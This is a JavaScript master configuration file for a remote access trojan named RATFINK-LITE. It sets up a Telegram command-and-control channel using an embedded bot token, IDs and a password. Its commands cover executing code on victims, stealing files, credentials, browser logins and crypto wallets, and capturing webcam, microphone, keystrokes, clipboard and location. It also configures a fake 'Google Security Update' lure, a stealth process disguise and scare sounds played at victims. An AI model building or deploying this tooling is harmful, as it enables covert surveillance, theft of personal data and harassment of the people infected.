// ============================================
// CONFIG.JS v7.0 FINAL - MASTER CONFIGURATION
// SEMUA KONFIGURASI RATFINK-LITE DALAM SATU FILE
// Copyright © VROZZ
// ============================================

const RATFINK_CONFIG = {
    // ========== VERSION INFO ==========
    version: '7.0 FINAL',
    build: '2024-03-14',
    author: 'VROZZ',
    
    // ========== TELEGRAM KONFIGURASI ==========
    telegram: {
        // GANTI: Token bot dari @BotFather
        BOT_TOKEN: '8711546914:AAFPV_Cs2ALUd6b1rJ56LM9fQy3z9axqoqs',
        
        // GANTI: ID grup Telegram (pake @getidsbot)
        GROUP_ID: '-1003858577739',
        
        // GANTI: Channel ID untuk broadcast (opsional)
        CHANNEL_ID: '-1001234567890',
        
        // Pengaturan notifikasi
        NOTIFY_ALL: true,
        MESSAGE_FORMAT: 'HTML',
        
        // Admin notification settings
        admin_notifications: {
            new_victim: true,
            victim_offline: true,
            command_executed: false,
            error_occurred: true,
            heartbeat_failure: true,
            file_received: true,
            screenshot_taken: true
        },
        
        // API settings
        api_url: 'https://api.telegram.org/bot',
        timeout: 5000,
        max_retries: 3
    },
    
    // ========== AKSES KONTROL MULTI-USER ==========
    access: {
        MODE: 'whitelist', // public/private/whitelist
        
        // ===== ADMIN LIST =====
        ADMINS: [
            7742916370,  // ID Telegram VROZZ - GANTI INI!
            7715205754   // ID Telegram admin 2 - GANTI INI!
        ],
        
        // ===== MODERATOR LIST =====
        MODERATORS: [
            55667788,  // ID mod 1 - GANTI INI!
            99887766   // ID mod 2 - GANTI INI!
        ],
        
        // ===== VIP USERS =====
        VIP_USERS: [
            44556677   // ID vip 1 - GANTI INI!
        ],
        
        // ===== WHITELIST =====
        ALLOWED_USERS: [
            12345678,  // Admin
            87654321,  // Admin
            55667788,  // Mod
            99887766,  // Mod
            44556677,  // VIP
            33445566,  // User trusted
            22334455   // User trusted
        ],
        
        // Password untuk mode private
        PASSWORD: 'arekloss86',
        
        // Blacklist
        BLACKLIST: [
            99999999,
            88888888
        ],
        
        // Session timeout (menit)
        SESSION_TIMEOUT: 30
    },
    
    // ========== ADMIN MENU CONFIG ==========
    admin_menu: {
        enabled: true,
        
        // Main menu categories
        categories: {
            dashboard: {
                name: '📊 DASHBOARD',
                icon: '📊',
                description: 'System statistics and overview',
                commands: [
                    '/admin_stats - Tampilkan statistik RATFINK-LITE',
                    '/admin_victims - Daftar semua victim',
                    '/admin_online - Victim online saat ini',
                    '/admin_logs - Lihat log aktivitas',
                    '/admin_health - Cek kesehatan sistem',
                    '/admin_uptime - Lihat uptime'
                ]
            },
            victim_management: {
                name: '🎯 VICTIM MANAGEMENT',
                icon: '🎯',
                description: 'Kelola semua victim',
                commands: [
                    '/admin_broadcast [pesan] - Kirim pesan ke semua victim',
                    '/admin_kill [victim_id] - Matikan RATFINK-LITE di victim',
                    '/admin_revive [victim_id] - Aktifkan kembali victim',
                    '/admin_lock [victim_id] - Kunci victim',
                    '/admin_unlock [victim_id] - Buka kunci victim',
                    '/admin_tag [victim_id] [tag] - Beri tag pada victim',
                    '/admin_note [victim_id] [note] - Tambah catatan',
                    '/admin_rename [victim_id] [name] - Ganti nama victim',
                    '/admin_delete [victim_id] - Hapus victim dari database'
                ]
            },
            file_operations: {
                name: '📁 FILE OPERATIONS',
                icon: '📁',
                description: 'Ambil dan kelola file',
                commands: [
                    '/admin_getfile [victim_id] [path] - Ambil file',
                    '/admin_listfiles [victim_id] [path] - List direktori',
                    '/admin_deletefile [victim_id] [path] - Hapus file',
                    '/admin_pushfile [victim_id] [url] - Push file ke victim',
                    '/admin_execute [victim_id] [cmd] - Execute command',
                    '/admin_download [url] - Download file ke server',
                    '/admin_upload [victim_id] - Upload file ke victim',
                    '/admin_search [victim_id] [keyword] - Cari file'
                ]
            },
            system_control: {
                name: '⚙️ SYSTEM CONTROL',
                icon: '⚙️',
                description: 'Kontrol sistem RATFINK-LITE',
                commands: [
                    '/admin_shutdown - Matikan semua RATFINK-LITE',
                    '/admin_restart - Restart semua RATFINK-LITE',
                    '/admin_update [url] - Update dari URL',
                    '/admin_config - Lihat konfigurasi saat ini',
                    '/admin_setconfig [key] [value] - Ubah konfigurasi',
                    '/admin_reset - Reset ke konfigurasi default',
                    '/admin_backup - Backup database',
                    '/admin_restore - Restore database'
                ]
            },
            user_management: {
                name: '👥 USER MANAGEMENT',
                icon: '👥',
                description: 'Kelola user grup',
                commands: [
                    '/admin_adduser [user_id] - Tambah user ke whitelist',
                    '/admin_removeuser [user_id] - Hapus user dari whitelist',
                    '/admin_block [user_id] - Blokir user',
                    '/admin_unblock [user_id] - Buka blokir user',
                    '/admin_setrole [user_id] [role] - Set role (admin/mod/vip/user)',
                    '/admin_users - Daftar semua user',
                    '/admin_userinfo [user_id] - Info user',
                    '/admin_promote [user_id] - Promosikan user',
                    '/admin_demote [user_id] - Turunkan jabatan'
                ]
            },
            surveillance: {
                name: '📹 SURVEILLANCE',
                icon: '📹',
                description: 'Fitur pengintaian',
                commands: [
                    '/admin_monitor [victim_id] - Monitor victim real-time',
                    '/admin_screenshot_all - Screenshot semua victim',
                    '/admin_location_all - Lokasi semua victim',
                    '/admin_webcam_all - Webcam semua victim',
                    '/admin_audio_all - Rekam audio semua victim',
                    '/admin_keylog_all - Keylog semua victim',
                    '/admin_clipboard_all - Clipboard semua victim',
                    '/admin_continuous [victim_id] [interval] - Continuous monitoring'
                ]
            },
            logging: {
                name: '📋 LOGGING',
                icon: '📋',
                description: 'Manajemen log',
                commands: [
                    '/admin_exportlogs - Export semua log',
                    '/admin_clearlogs - Hapus semua log',
                    '/admin_searchlogs [keyword] - Cari di log',
                    '/admin_alertlog [level] - Set alert level',
                    '/admin_logs [victim_id] - Log specific victim',
                    '/admin_summary - Ringkasan log'
                ]
            },
            network: {
                name: '🌐 NETWORK',
                icon: '🌐',
                description: 'Network settings',
                commands: [
                    '/admin_proxy [ip:port] - Set proxy',
                    '/admin_vpn [on/off] - VPN control',
                    '/admin_tor [on/off] - Tor routing',
                    '/admin_relay [victim_id] - Relay connection',
                    '/admin_portscan [victim_id] - Port scan',
                    '/admin_networkinfo - Info jaringan'
                ]
            },
            audio_control: {
                name: '🎵 AUDIO CONTROL',
                icon: '🎵',
                description: 'Fitur audio lengkap',
                commands: [
                    '/admin_play [victim_id] [url/preset] - Play audio',
                    '/admin_stop [victim_id] - Stop audio',
                    '/admin_tts [victim_id] [text] - Text to speech',
                    '/admin_record [victim_id] [duration] - Record mic',
                    '/admin_scream [victim_id] - Mainkan suara teriak',
                    '/admin_presets - List preset audio',
                    '/admin_volume [victim_id] [0-1] - Set volume'
                ]
            },
            advanced: {
                name: '🔧 ADVANCED',
                icon: '🔧',
                description: 'Fitur lanjutan',
                commands: [
                    '/admin_exploit [victim_id] [exploit] - Run exploit',
                    '/admin_inject [victim_id] [code] - Inject JS code',
                    '/admin_persistence [victim_id] [on/off] - Persistence',
                    '/admin_stealth [victim_id] [level] - Set stealth mode',
                    '/admin_encrypt [on/off] - Encrypt communications',
                    '/admin_obfuscate [victim_id] - Obfuscate payload'
                ]
            }
        },
        
        // Quick commands (shortcuts)
        quick_commands: {
            '/astats': '/admin_stats',
            '/avictims': '/admin_victims',
            '/aonline': '/admin_online',
            '/abroadcast': '/admin_broadcast',
            '/akill': '/admin_kill',
            '/aconfig': '/admin_config',
            '/ausers': '/admin_users',
            '/amonitor': '/admin_monitor',
            '/aexport': '/admin_exportlogs',
            '/ascreen': '/admin_screenshot_all',
            '/aloc': '/admin_location_all',
            '/aplay': '/admin_play',
            '/astop': '/admin_stop',
            '/arecord': '/admin_record',
            '/ahelp': '/admin_help'
        },
        
        // Admin command permissions
        permissions: {
            super_admin: {
                can_manage_admins: true,
                can_modify_config: true,
                can_shutdown: true,
                can_delete_victims: true,
                can_access_all: true,
                can_edit_any_file: true,
                can_execute_any_command: true,
                can_promote_demote: true,
                can_blacklist: true
            },
            admin: {
                can_manage_mods: true,
                can_view_config: true,
                can_control_victims: true,
                can_access_files: true,
                can_broadcast: true,
                can_use_surveillance: true,
                can_view_logs: true,
                cannot: ['shutdown', 'delete_victims', 'modify_config']
            },
            moderator: {
                can_view_victims: true,
                can_view_logs: true,
                can_use_basic_commands: true,
                can_monitor: true,
                cannot: ['broadcast', 'access_files', 'modify_users', 'shutdown']
            },
            vip: {
                can_view_stats: true,
                can_view_online: true,
                can_use_basic_commands: true,
                can_request_files: true,
                cannot: ['admin_commands', 'modify', 'control']
            },
            user: {
                can_use_basic_commands: true,
                can_view_help: true,
                cannot: ['admin_commands', 'victim_control', 'file_access']
            }
        },
        
        // Admin help menu
        help_menu: {
            header: '🔰 *RATFINK-LITE ADMIN PANEL* 🔰\n\n',
            footer: '\nGunakan /admin_help [category] untuk detail\nCopyright © VROZZ',
            categories: {
                'dashboard': '📊 Dashboard commands',
                'victim': '🎯 Victim management',
                'file': '📁 File operations',
                'system': '⚙️ System control',
                'user': '👥 User management',
                'surveillance': '📹 Surveillance',
                'log': '📋 Logging',
                'network': '🌐 Network',
                'audio': '🎵 Audio',
                'advanced': '🔧 Advanced'
            }
        }
    },
    
    // ========== ADMIN DASHBOARD ==========
    admin_dashboard: {
        refresh_interval: 30,
        show_uptime: true,
        show_victim_count: true,
        show_active_commands: true,
        show_system_health: true,
        show_network_status: true,
        show_memory_usage: true,
        show_cpu_usage: true,
        
        stats: {
            total_victims: 0,
            online_victims: 0,
            offline_victims: 0,
            blocked_victims: 0,
            total_files: 0,
            total_data: '0 MB',
            uptime: '0d 0h 0m',
            commands_today: 0,
            commands_total: 0,
            active_users: 0,
            start_time: null
        },
        
        charts: {
            victims_over_time: [],
            commands_over_time: [],
            data_transfer: []
        }
    },
    
    // ========== VICTIM MANAGEMENT ==========
    victims: {
        ID_PREFIX: 'RATFINK',
        ID_FORMAT: 'RATFINK_{timestamp}_{random}',
        
        track_location: true,
        track_activity: true,
        track_files: true,
        track_screenshots: true,
        track_audio: true,
        track_keystrokes: false,
        
        HEARTBEAT_INTERVAL: 30,
        OFFLINE_TIMEOUT: 120,
        
        NOTIFY_NEW_VICTIM: true,
        NOTIFY_VICTIM_OFFLINE: true,
        NOTIFY_VICTIM_RECONNECT: true,
        
        MAX_HISTORY: 1000,
        
        tags: [
            'high_value',
            'testing',
            'corporate',
            'personal',
            'bot',
            'mobile',
            'desktop'
        ],
        
        auto_actions: {
            on_new_victim: 'notify',
            on_offline: 'tag offline',
            on_reconnect: 'notify'
        }
    },
    
    // ========== FILE ACQUISITION ==========
    file_acquisition: {
        ENABLED: true,
        
        TARGET_EXTENSIONS: {
            images: ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.ico', '.svg', '.tiff'],
            documents: ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf', '.odt', '.ods', '.odp'],
            archives: ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.iso'],
            databases: ['.sql', '.db', '.sqlite', '.mdb', '.accdb', '.dbf'],
            configs: ['.conf', '.cfg', '.ini', '.json', '.xml', '.yaml', '.yml', '.toml'],
            credentials: ['.kdbx', '.key', '.pem', '.ppk', '.ovpn', '.p12', '.pfx', '.kdb'],
            media: ['.mp4', '.mp3', '.wav', '.avi', '.mov', '.mkv', '.flac', '.aac', '.ogg', '.webm'],
            contacts: ['.vcf', '.csv', '.xls', '.xlsx'],
            messages: ['.pst', '.eml', '.mbox', '.msg'],
            browser: ['cookies.sqlite', 'Login Data', 'History', 'Bookmarks', 'Web Data'],
            wifi: ['wpa_supplicant.conf', 'wifi.conf', 'networks.xml'],
            crypto: ['wallet.dat', '.wallet', 'keystore', '.eth', '.btc'],
            source: ['.php', '.js', '.html', '.css', '.py', '.java', '.cpp', '.c', '.rb', '.go']
        },
        
        SCAN_PATHS: {
            android: [
                '/sdcard/',
                '/sdcard/Download/',
                '/sdcard/DCIM/',
                '/sdcard/Pictures/',
                '/sdcard/Documents/',
                '/sdcard/WhatsApp/',
                '/sdcard/Telegram/',
                '/sdcard/Instagram/',
                '/sdcard/Facebook/',
                '/sdcard/Messages/',
                '/storage/emulated/0/',
                '/data/data/com.whatsapp/',
                '/data/data/com.instagram.android/',
                '/data/data/com.facebook.katana/',
                '/data/data/com.tencent.mm/',
                '/data/data/org.telegram.messenger/'
            ],
            ios: [
                '/var/mobile/',
                '/var/mobile/Media/',
                '/var/mobile/Library/',
                '/private/var/mobile/',
                '/User/',
                '/var/mobile/Containers/Data/Application/'
            ],
            windows: [
                'C:\\Users\\',
                'C:\\Users\\%USERNAME%\\Desktop\\',
                'C:\\Users\\%USERNAME%\\Documents\\',
                'C:\\Users\\%USERNAME%\\Downloads\\',
                'C:\\Users\\%USERNAME%\\Pictures\\',
                'C:\\Users\\%USERNAME%\\Videos\\',
                'C:\\Users\\%USERNAME%\\Music\\',
                'C:\\Users\\%USERNAME%\\AppData\\Local\\',
                'C:\\Users\\%USERNAME%\\AppData\\Roaming\\',
                'C:\\ProgramData\\',
                'C:\\Windows\\Temp\\'
            ],
            linux: [
                '/home/',
                '/home/%USERNAME%/',
                '/root/',
                '/etc/',
                '/var/',
                '/tmp/',
                '/opt/'
            ]
        },
        
        MAX_FILE_SIZE: 50 * 1024 * 1024,
        MAX_TOTAL_SIZE: 500 * 1024 * 1024,
        MIN_FILE_SIZE: 1,
        
        AUTO_COMPRESS: true,
        COMPRESSION_LEVEL: 0.8,
        COMPRESSED_FORMATS: ['.txt', '.log', '.json', '.xml', '.csv'],
        
        CHUNK_SIZE: 1024 * 1024,
        ENABLE_CHUNKING: true,
        MAX_CHUNKS: 100,
        
        AUTO_DOWNLOAD: false,
        
        download_rules: {
            auto_download_images: false,
            auto_download_docs: false,
            auto_download_creds: true,
            max_concurrent: 3
        },
        
        OBFUSCATE_FILENAMES: true,
        HIDE_ACTIVITY: true,
        DELETE_AFTER_UPLOAD: false,
        
        SCAN_ON_CONNECT: false,
        SCAN_DEPTH: 3,
        SCAN_HIDDEN: false
    },
    
    // ========== AUDIO FEATURES ==========
    audio: {
        ENABLED: true,
        
        ALLOW_URL: true,
        ALLOW_BASE64: true,
        ALLOW_TTS: true,
        ALLOW_RECORD: true,
        ALLOW_PRESET: true,
        
        MAX_VOLUME: 1.0,
        DEFAULT_VOLUME: 0.7,
        MIN_VOLUME: 0.1,
        
        PRESET_SOUNDS: {
            SCREAM: 'https://www.soundjay.com/misc/sounds/scream-1.mp3',
            SCREAM2: 'https://www.soundjay.com/misc/sounds/scream-2.mp3',
            SCREAM_WOMAN: 'https://www.soundjay.com/misc/sounds/woman-scream-1.mp3',
            SCREAM_CHILD: 'https://www.soundjay.com/misc/sounds/child-scream-1.mp3',
            EVIL_LAUGH: 'https://www.soundjay.com/misc/sounds/evil-laugh-1.mp3',
            EVIL_LAUGH2: 'https://www.soundjay.com/misc/sounds/evil-laugh-2.mp3',
            CREEPY_LADY: 'https://www.soundjay.com/halloween/sounds/creepy-lady-1.mp3',
            GHOST: 'https://www.soundjay.com/halloween/sounds/ghost-1.mp3',
            WEREWOLF: 'https://www.soundjay.com/halloween/sounds/werewolf-1.mp3',
            ALERT: 'https://www.soundjay.com/button/beep-01a.mp3',
            ALERT2: 'https://www.soundjay.com/button/beep-02.mp3',
            ALERT3: 'https://www.soundjay.com/button/beep-03.mp3',
            SIREN: 'https://www.soundjay.com/misc/sounds/police-siren-1.mp3',
            SIREN2: 'https://www.soundjay.com/misc/sounds/ambulance-siren-1.mp3',
            ALARM: 'https://www.soundjay.com/misc/sounds/alarm-1.mp3',
            ALARM2: 'https://www.soundjay.com/misc/sounds/alarm-2.mp3',
            BURGLAR_ALARM: 'https://www.soundjay.com/misc/sounds/burglar-alarm-1.mp3',
            FIRE_ALARM: 'https://www.soundjay.com/misc/sounds/fire-alarm-1.mp3',
            GUNSHOT: 'https://www.soundjay.com/gun/sounds/gunshot-1.mp3',
            GUNSHOT2: 'https://www.soundjay.com/gun/sounds/gunshot-2.mp3',
            GUNSHOT3: 'https://www.soundjay.com/gun/sounds/gunshot-3.mp3',
            MACHINE_GUN: 'https://www.soundjay.com/gun/sounds/machine-gun-1.mp3',
            SHOTGUN: 'https://www.soundjay.com/gun/sounds/shotgun-1.mp3',
            EXPLOSION: 'https://www.soundjay.com/gun/sounds/explosion-1.mp3',
            EXPLOSION2: 'https://www.soundjay.com/gun/sounds/explosion-2.mp3',
            BOMB: 'https://www.soundjay.com/gun/sounds/bomb-1.mp3',
            GRENADE: 'https://www.soundjay.com/gun/sounds/grenade-1.mp3',
            RAIN: 'https://www.soundjay.com/nature/sounds/rain-1.mp3',
            RAIN2: 'https://www.soundjay.com/nature/sounds/rain-2.mp3',
            THUNDER: 'https://www.soundjay.com/nature/sounds/thunder-1.mp3',
            THUNDER2: 'https://www.soundjay.com/nature/sounds/thunder-2.mp3',
            WIND: 'https://www.soundjay.com/nature/sounds/wind-1.mp3',
            STORM: 'https://www.soundjay.com/nature/sounds/storm-1.mp3',
            WAVES: 'https://www.soundjay.com/nature/sounds/waves-1.mp3',
            FOREST: 'https://www.soundjay.com/nature/sounds/forest-1.mp3',
            DOG_BARK: 'https://www.soundjay.com/animal/sounds/dog-bark-1.mp3',
            CAT_MEOW: 'https://www.soundjay.com/animal/sounds/cat-meow-1.mp3',
            COW: 'https://www.soundjay.com/animal/sounds/cow-1.mp3',
            ROOSTER: 'https://www.soundjay.com/animal/sounds/rooster-1.mp3',
            WOLF_HOWL: 'https://www.soundjay.com/animal/sounds/wolf-howl-1.mp3',
            RICK_ROLL: 'https://www.soundjay.com/misc/sounds/rick-roll.mp3',
            FUNNY: 'https://www.soundjay.com/misc/sounds/funny-laugh-1.mp3',
            FUNNY2: 'https://www.soundjay.com/misc/sounds/funny-laugh-2.mp3',
            CLAPPING: 'https://www.soundjay.com/misc/sounds/clapping-1.mp3',
            BOO: 'https://www.soundjay.com/misc/sounds/boo-1.mp3',
            WHISPER: 'base64:UklGRlwAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVgAAAC/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/',
            COUGH: 'https://www.soundjay.com/human/sounds/cough-1.mp3',
            SNEEZE: 'https://www.soundjay.com/human/sounds/sneeze-1.mp3',
            YAWN: 'https://www.soundjay.com/human/sounds/yawn-1.mp3',
            SNORE: 'https://www.soundjay.com/human/sounds/snore-1.mp3',
            BOING: 'https://www.soundjay.com/cartoon/sounds/boing-1.mp3',
            CRASH: 'https://www.soundjay.com/cartoon/sounds/crash-1.mp3',
            SLAP: 'https://www.soundjay.com/cartoon/sounds/slap-1.mp3',
            SPLAT: 'https://www.soundjay.com/cartoon/sounds/splat-1.mp3',
            WHISTLE: 'https://www.soundjay.com/cartoon/sounds/whistle-1.mp3'
        },
        
        HIDE_AUDIO_CONTROLS: true,
        AUTO_PLAY: true,
        LOOP_ENABLED: true,
        CROSSFADE: false,
        FADE_IN: 0.5,
        FADE_OUT: 0.5,
        
        RECORD_FORMAT: 'audio/webm',
        RECORD_DURATION: 15,
        RECORD_QUALITY: 0.8,
        AUTO_SEND_RECORDING: true,
        MAX_RECORDINGS: 5,
        
        TTS_LANGUAGES: ['id-ID', 'en-US', 'ja-JP', 'ko-KR', 'zh-CN', 'ar-SA', 'hi-IN', 'fr-FR', 'de-DE', 'es-ES'],
        DEFAULT_TTS_LANG: 'id-ID',
        TTS_VOICES: {
            'id-ID': ['female', 'male', 'google'],
            'en-US': ['female', 'male', 'child', 'google'],
            'ja-JP': ['female', 'male'],
            'ko-KR': ['female', 'male']
        },
        TTS_RATE: 1.0,
        TTS_PITCH: 1.0,
        
        EFFECTS: {
            ECHO: false,
            REVERB: false,
            PITCH_SHIFT: false,
            SPEED: 1.0,
            BASS_BOOST: false
        },
        
        QUEUE_ENABLED: true,
        MAX_QUEUE: 10
    },
    
    // ========== SURVEILLANCE ==========
    surveillance: {
        ENABLED: true,
        
        screenshot: {
            quality: 0.8,
            format: 'png',
            auto_send: true,
            max_width: 1920,
            max_height: 1080
        },
        
        webcam: {
            auto_accept: false,
            preferred_camera: 'any',
            resolution: 'hd',
            auto_send: true
        },
        
        location: {
            high_accuracy: true,
            timeout: 10000,
            maximum_age: 0,
            auto_track: false,
            track_interval: 300
        },
        
        keylogger: {
            enabled: false,
            buffer_size: 1000,
            auto_send: false,
            send_interval: 60
        },
        
        clipboard: {
            enabled: true,
            auto_send: true,
            send_on_change: true
        },
        
        network: {
            enabled: true,
            track_connections: false,
            track_dns: false
        }
    },
    
    // ========== COMMAND CUSTOM ==========
    custom_commands: {
        '/spook': 'audioController.playPreset("CREEPY_LADY", 0.9, true)',
        '/takut': 'audioController.playPreset("SCREAM", 1.0, false)',
        '/santai': 'audioController.playFromUrl("https://example.com/relax.mp3", 0.5, true)',
        '/kaget': 'audioController.playPreset("SCREAM2")',
        '/ngomong': 'audioController.textToSpeech("Halo, ini pesan dari VROZZ")',
        '/teriak': 'audioController.playPreset("SCREAM_WOMAN", 1.0, true)',
        '/lagu': 'audioController.playPreset("RICK_ROLL", 0.8, true)',
        '/hujan': 'audioController.playPreset("RAIN", 0.4, true)',
        '/petir': 'audioController.playPreset("THUNDER", 0.7, false)',
        '/anjing': 'audioController.playPreset("DOG_BARK", 0.8, true)',
        '/gelap': 'document.body.style.backgroundColor = "black"; document.body.style.color = "white"',
        '/terang': 'document.body.style.backgroundColor = "white"; document.body.style.color = "black"',
        '/getar': 'navigator.vibrate ? navigator.vibrate([500,200,500]) : "Vibrate not supported"',
        '/kedip': 'let i=0; setInterval(() => document.body.style.backgroundColor = i++%2 ? "red" : "white", 500)',
        '/sadap': 'alert("This device is under surveillance by RATFINK-LITE")',
        '/matiin': 'window.close()',
        '/refresh': 'location.reload()',
        '/back': 'history.back()',
        '/forward': 'history.forward()',
        '/print': 'window.print()',
        '/download_test': 'fileAcq.downloadFromUrl("https://example.com/test.txt", "test.txt")',
        '/scan_page': 'fileAcq.scanPageForFiles()',
        '/baterai': 'navigator.getBattery ? navigator.getBattery().then(b => `Battery: ${b.level*100}% ${b.charging ? "Charging" : "Not charging"}`) : "Battery API not supported"',
        '/memory': '`Device memory: ${navigator.deviceMemory || "unknown"} GB`',
        '/cpu': '`CPU cores: ${navigator.hardwareConcurrency || "unknown"}`'
    },
    
    // ========== WEBHOOK ==========
    webhooks: {
        ENABLED: false,
        URL: 'https://your-server.com/webhook',
        SECRET: 'vrozz_secret_123',
        METHOD: 'POST',
        TIMEOUT: 5000,
        RETRIES: 3,
        
        events: {
            new_victim: true,
            command_result: false,
            file_received: true,
            heartbeat: false,
            error: true
        }
    },
    
    // ========== DATABASE ==========
    database: {
        type: 'indexeddb',
        name: 'ratfink_database',
        version: 1,
        
        tables: {
            victims: 'id, firstSeen, lastSeen, status, data',
            commands: 'id, victimId, command, result, timestamp',
            files: 'id, victimId, filename, size, timestamp',
            logs: 'id, level, message, timestamp',
            users: 'id, role, addedBy, timestamp'
        },
        
        auto_cleanup: true,
        cleanup_interval: 86400,
        max_records: 10000
    },
    
    // ========== UI/UX ==========
    ui: {
        THEME: 'dark',
        LANGUAGE: 'id',
        FAKE_PROGRESS: true,
        FAKE_WARNING: true,
        FAKE_ERROR: true,
        REDIRECT_TIMEOUT: 3,
        SHOW_VICTIM_ID: true,
        SHOW_STATUS: true,
        SHOW_AUDIO_STATUS: true,
        
        fake_page: {
            title: 'Google Security Update',
            icon: '🛡️',
            company: 'Google LLC',
            year: '2024',
            message: 'Critical security patch required for your device'
        },
        
        colors: {
            primary: '#3b82f6',
            secondary: '#8b5cf6',
            success: '#10b981',
            warning: '#f59e0b',
            danger: '#ef4444',
            dark: '#0f172a',
            light: '#f8fafc'
        }
    },
    
    // ========== ENKRIPSI & OBFUSCATION ==========
    security: {
        ENCRYPT_COMMS: false,
        ENCRYPTION_KEY: 'vrozz_key_2024',
        ENCRYPTION_ALGO: 'aes-256',
        
        OBFUSCATE_JS: true,
        OBFUSCATION_LEVEL: 'medium',
        
        HIDE_DEBUG: true,
        HIDE_CONSOLE: false,
        
        ANTI_DEVTOOLS: false,
        ANTI_DEVTOOLS_ACTION: 'redirect',
        
        FAKE_ERRORS: true,
        FAKE_ERRORS_RATE: 0.1,
        
        ANTI_DEBUG: {
            enabled: false,
            redirect_url: 'https://google.com',
            block_on_open: true
        }
    },
    
    // ========== STEALTH MODE ==========
    stealth: {
        ENABLED: true,
        LEVEL: 'medium',
        
        HIDE_TASK: true,
        FAKE_PROCESS: 'Google Update Helper',
        NO_POPUPS: true,
        SILENT_MODE: false,
        HIDE_ON_BLUR: false,
        FAKE_URL: 'https://google.com/security-update'
    }
};

// ============================================
// FUNGSI-FUNGSI BANTUAN
// ============================================

function isAdmin(userId) {
    return RATFINK_CONFIG.access.ADMINS.includes(parseInt(userId));
}

function isModerator(userId) {
    return RATFINK_CONFIG.access.MODERATORS.includes(parseInt(userId));
}

function isVIP(userId) {
    return RATFINK_CONFIG.access.VIP_USERS.includes(parseInt(userId));
}

function isBlacklisted(userId) {
    return RATFINK_CONFIG.access.BLACKLIST.includes(parseInt(userId));
}

function getUserRole(userId) {
    const userIdNum = parseInt(userId);
    
    if (isBlacklisted(userIdNum)) return 'blacklisted';
    if (isAdmin(userIdNum)) return 'admin';
    if (isModerator(userIdNum)) return 'moderator';
    if (isVIP(userIdNum)) return 'vip';
    
    if (RATFINK_CONFIG.access.ALLOWED_USERS.includes(userIdNum)) {
        return 'user';
    }
    
    if (RATFINK_CONFIG.access.MODE === 'public') {
        return 'public_user';
    }
    
    return 'unauthorized';
}

function isUserAuthorized(userId, command = '') {
    const userIdNum = parseInt(userId);
    const role = getUserRole(userIdNum);
    
    if (role === 'blacklisted') return false;
    
    if (RATFINK_CONFIG.access.MODE === 'public') {
        return role !== 'unauthorized';
    }
    
    if (RATFINK_CONFIG.access.MODE === 'whitelist') {
        return role !== 'unauthorized' && role !== 'public_user';
    }
    
    if (RATFINK_CONFIG.access.MODE === 'private') {
        return true;
    }
    
    return false;
}

function getUserPermissions(userId) {
    const role = getUserRole(userId);
    
    switch(role) {
        case 'admin':
            return RATFINK_CONFIG.admin_menu.permissions.admin;
        case 'moderator':
            return RATFINK_CONFIG.admin_menu.permissions.moderator;
        case 'vip':
            return RATFINK_CONFIG.admin_menu.permissions.vip;
        case 'user':
        case 'public_user':
            return RATFINK_CONFIG.admin_menu.permissions.user;
        default:
            return { can_use_basic_commands: false };
    }
}

function isCommandAllowed(userId, command) {
    const role = getUserRole(userId);
    let baseCommand = command.split(' ')[0].toLowerCase();
    
    if (role === 'admin') return true;
    
    if (RATFINK_CONFIG.admin_menu.quick_commands[baseCommand]) {
        baseCommand = RATFINK_CONFIG.admin_menu.quick_commands[baseCommand];
    }
    
    if (baseCommand.startsWith('/admin_')) {
        return role === 'admin';
    }
    
    if (role === 'moderator') {
        const modAllowed = [
            '/admin_stats', '/admin_victims', '/admin_online', 
            '/admin_logs', '/admin_monitor', '/admin_help'
        ];
        if (modAllowed.includes(baseCommand)) return true;
    }
    
    const basicCommands = [
        '/ping', '/info', '/help', '/play', '/stop', 
        '/presets', '/volume', '/tts'
    ];
    
    if (basicCommands.includes(baseCommand)) return true;
    
    if (RATFINK_CONFIG.custom_commands[baseCommand]) return true;
    
    return false;
}

function generateVictimId() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substr(2, 8);
    return `RATFINK_${timestamp}_${random}`;
}

function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    return date.toLocaleString('id-ID', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
}

function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    
    const parts = [];
    if (days > 0) parts.push(`${days}d`);
    if (hours > 0) parts.push(`${hours}h`);
    if (minutes > 0) parts.push(`${minutes}m`);
    if (secs > 0) parts.push(`${secs}s`);
    
    return parts.join(' ') || '0s';
}

function formatTelegramMessage(type, data) {
    const templates = {
        new_victim: `🆕 *VICTIM BARU ONLINE - RATFINK-LITE*\n━━━━━━━━━━━━━━\nID: \`${data.id}\`\nIP: ${data.ip || 'Unknown'}\nPlatform: ${data.platform}\nBrowser: ${data.browser}\nTimezone: ${data.timezone}\nURL: ${data.url}\nWaktu: ${data.time}\n━━━━━━━━━━━━━━\n👤 User: ${data.userId}`,
        
        command_result: `📝 *HASIL COMMAND - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nCommand: \`${data.command}\`\nStatus: ${data.status}\n━━━━━━━━━━━━━━\n${data.result}\n━━━━━━━━━━━━━━\n👤 Eksekutor: ${data.executor}`,
        
        heartbeat: `💓 *HEARTBEAT - RATFINK-LITE*\n━━━━━━━━━━━━━━\nVictim: \`${data.victimId}\`\nStatus: ${data.status}\nUptime: ${data.uptime}\nActivity: ${data.activity}\n━━━━━━━━━━━━━━`,
        
